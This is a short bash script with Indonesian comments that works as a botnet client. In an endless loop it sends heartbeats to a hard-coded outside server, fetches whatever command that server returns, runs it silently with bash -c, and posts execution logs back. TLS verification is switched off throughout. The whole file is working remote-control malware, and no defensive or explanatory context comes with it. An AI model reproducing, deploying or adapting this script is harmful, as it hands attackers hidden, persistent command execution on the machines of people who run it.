#!/bin/bash

BOT_ID=$(whoami)
SERVER="https://matasiber.web.id/bot"

while true; do
  # heartbeat
  curl -s -k --connect-timeout 5 --max-time 10 "$SERVER/heartbeat.php?bot_id=$BOT_ID" > /dev/null

  # ambil command
  CMD=$(curl -s -k --connect-timeout 5 --max-time 10 "$SERVER/command.php?bot_id=$BOT_ID")

  if [ -n "$CMD" ]; then
    # log sebelum eksekusi
    curl -k --connect-timeout 5 --max-time 10 -s -X POST "$SERVER/log.php" \
      -d "bot_id=$BOT_ID" \
      -d "message=$BOT_ID: eksekusi dimulai" > /dev/null

    # eksekusi command (output dibuang)
    bash -c "$CMD" >/dev/null 2>&1

    # log setelah eksekusi
    curl -k --connect-timeout 5 --max-time 10 -s -X POST "$SERVER/log.php" \
      -d "bot_id=$BOT_ID" \
      -d "message=$BOT_ID: eksekusi selesai" > /dev/null
  fi

  sleep 2
done
